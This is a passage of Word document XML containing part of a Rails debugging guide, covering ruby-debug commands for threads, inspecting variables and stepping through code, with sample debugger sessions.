      </w:r>
    </w:p>
    <w:p w14:paraId="470770EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The debugger can list, stop, resume and switch between running threads by using the command </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>thread</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (or the abbreviated </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r>
        <w:t>). This command has a handful of options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0383E22F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="347"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>thread</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows the current thread.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7588CD62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="347"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>thread list</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is used to list all threads and their statuses. The plus + character and the number indicates the current thread of execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3C1E2B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="347"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>thread stop _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> stop thread </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495E0AF2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="347"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>thread resume _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> resumes thread </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D6D003" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="347"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>thread switch _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> switches the current thread context to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F6E4B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This command is very helpful, among other occasions, when you are debugging concurrent threads and need to verify that there are no race conditions in your code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B15AB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 Inspecting Variables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F0BE5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Any expression can be evaluated in the current context. To evaluate an expression, just type it!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC41156" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This example shows how you can print the instance_variables defined within the current context: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DC1BEAC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78D9ED60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@posts = Post.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B74739C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:11) instance_variables</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D840BB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>["@_response", "@action_name", "@url", "@_session", "@_cookies", "@performed_render", "@_flash", "@template", "@_params", "@before_filter_chain_aborted", "@request_origin", "@_headers", "@performed_redirect", "@_request"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3CBCB4DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you may have figured out, all of the variables that you can access from a controller are displayed. This list is dynamically updated as you execute code. For example, run the next line using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (you’ll learn more about this command later in this guide).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E333A73" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E7336D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:11) next</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="150A89B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Processing PostsController#index (for 127.0.0.1 at 2008-09-04 19:51:34) [GET]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50518473" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Session ID: BAh7BiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNoSGFzaHsABjoKQHVzZWR7AA==--b16e91b992453a8cc201694d660147bba8b0fd0e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6253033F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Parameters: {"action"=&gt;"index", "controller"=&gt;"posts"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25B06F11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/PathToProject/posts_controller.rb:8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CA19738" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>respond_to do |format|</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E563866" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And then ask again for the instance_variables:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3ED55EEC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CBE8D19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:11) instance_variables.include? "@posts"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3537F597" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AA75F00" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@posts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is included in the instance variables, because the line defining it was executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F43F9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also step into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>irb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> mode with the command </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>irb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (of course!). This way an irb session will be started within the context you invoked it. But be warned: this is an experimental feature.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32396837" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is the most convenient way to show variables and their values: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A871DEB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F5FDB52" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>var</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B6DD4B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) v[ar] const &lt;object&gt;            show constants of object</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F868151" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) v[ar] g[lobal]                  show global variables</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="261BDE9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) v[ar] i[nstance] &lt;object&gt;       show instance variables of object</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1637ECE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) v[ar] l[ocal]                   show local variables</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C93CAB1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This is a great way to inspect the values of the current context variables. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5A76F5A0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3CD3A7C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:9) var local</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ED7DE46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  __dbg_verbose_save =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="20B9DEEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also inspect for an object method this way:</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5CE443B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15AA2834" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:9) var instance Post.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BD52144" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@attributes = {"updated_at"=&gt;nil, "body"=&gt;nil, "title"=&gt;nil, "published"=&gt;nil, "created_at"...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A6A0764" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@attributes_cache = {}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50AA716D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@new_record = true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="451C58E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The commands </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (print) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pp</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (pretty print) can be used to evaluate Ruby expressions and display the value of variables to the console.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8BB570" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use also </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>display</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to start watching variables. This is a good way of tracking the values of a variable while the execution goes on.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0F5756F7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69BC7EE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:1) display @recent_comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F5C3482" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1: @recent_comments =</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24AFFF66" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The variables inside the displaying list will be printed with their values after you move in the stack. To stop displaying a variable use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>undisplay _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> where </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the variable number (1 in the last example).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE5B257" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.6 Step by Step</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF7759F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now you should know where you are in the running trace and be able to print the available variables. But lets continue and move on with the application execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C680936" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (abbreviated </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>) to continue running your program until the next logical stopping point and return control to ruby-debug.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E363C27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>step+ n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>step- n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to move forward or backward </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> steps respectively.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AE6E59" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You may also use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is similar to step, but function or method calls that appear within the line of code are executed without stopping. As with step, you may use plus sign to move </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> steps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCC1F6E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The difference between </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> stops at the next line of code executed, doing just a single step, while </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> moves to the next line without descending inside methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DE834C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, consider this block of code with an included </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>debugger</w:t>
      </w:r>
      <w:r>
